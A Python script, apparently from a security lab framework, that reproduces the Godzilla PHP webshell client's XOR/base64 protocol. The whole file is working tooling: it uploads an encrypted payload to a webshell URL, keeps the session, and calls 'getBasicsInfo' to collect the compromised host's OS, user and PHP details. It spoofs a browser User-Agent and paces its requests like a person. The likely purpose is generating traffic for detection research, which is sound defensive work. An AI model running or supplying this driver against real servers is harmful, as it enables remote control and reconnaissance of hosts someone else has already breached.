#!/usr/bin/env python3
"""Godzilla (哥斯拉) PHP XOR protocol driver.

Replicates the official Godzilla v4.0.1 client's php_xor_base64 cryption
byte-for-byte (verified against shells.cryptions.phpXor.PhpXor in
godzilla.jar):

  request  = pass=<urlencoded base64( xor(data, key) )>
  key      = secretKey bytes; xor uses key[(i+1) & 15]
  response = md5(pass+key)[0:16] + base64( xor(result, key) )
             + md5(pass+key)[16:32]

Flow (same as the real client):
  1. upload the payload.php asset (contains "getBasicsInfo") -> server stores
     it in $_SESSION['payload']
  2. methodName=getBasicsInfo -> server evals the stored payload and returns
     host basics (os/user/php info)
  3. repeat a few ops with a human-like pause between them
"""

import base64
import hashlib
import struct
import sys
import time
import urllib.parse
import urllib.request


def xor_key(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[(i + 1) & 15] for i, b in enumerate(data))


def encode_request(data: bytes, key: bytes) -> str:
    enc = base64.b64encode(xor_key(data, key))
    return urllib.parse.quote_plus(enc.decode())


def build_params(pairs) -> bytes:
    out = b""
    for k, v in pairs:
        vb = v.encode() if isinstance(v, str) else v
        out += k.encode() + b"\x02" + struct.pack(">I", len(vb)) + vb
    return out


def decode_response(body: bytes, key: bytes, marker: str) -> bytes:
    text = body.decode(errors="ignore")
    left = marker[:16]
    right = marker[16:32]
    if left in text and right in text:
        mid = text.split(left, 1)[1].split(right, 1)[0]
        return xor_key(base64.b64decode(mid), key)
    return b""


def post(url: str, passname: str, data: bytes, key: bytes, cookie: str):
    body = f"{passname}={encode_request(data, key)}".encode()
    req = urllib.request.Request(
        url,
        data=body,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/92.0.4515.131 Safari/537.36",
            "Cookie": cookie,
        },
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        return resp.read(), resp.headers.get("Set-Cookie", "").split(";")[0]


def main():
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/gz.php"
    passname = sys.argv[2] if len(sys.argv) > 2 else "pass"
    key = (sys.argv[3] if len(sys.argv) > 3 else "godzillakey123456").encode()
    ops = int(sys.argv[4]) if len(sys.argv) > 4 else 4
    pause = float(sys.argv[5]) if len(sys.argv) > 5 else 2.0

    payload = open(
        "/lab/src/framework/drivers/godzilla/assets/payload.php", "rb"
    ).read()
    marker = hashlib.md5((passname + key.decode()).encode()).hexdigest()
    cookie = ""

    # 1. payload upload (server keeps it in the PHP session)
    _, cookie = post(url, passname, payload, key, cookie)
    print("payload uploaded", file=sys.stderr)
    time.sleep(pause)

    # 2..N method calls (getBasicsInfo + a couple of benign ops)
    methods = ["getBasicsInfo", "getBasicsInfo"]
    for m in methods:
        data = build_params([("codeName", ""), ("methodName", m)])
        body, cookie = post(url, passname, data, key, cookie)
        result = decode_response(body, key, marker)
        print(
            f"method={m} resp_len={len(body)} decrypted_len={len(result)}",
            file=sys.stderr,
        )
        time.sleep(pause)


if __name__ == "__main__":
    main()
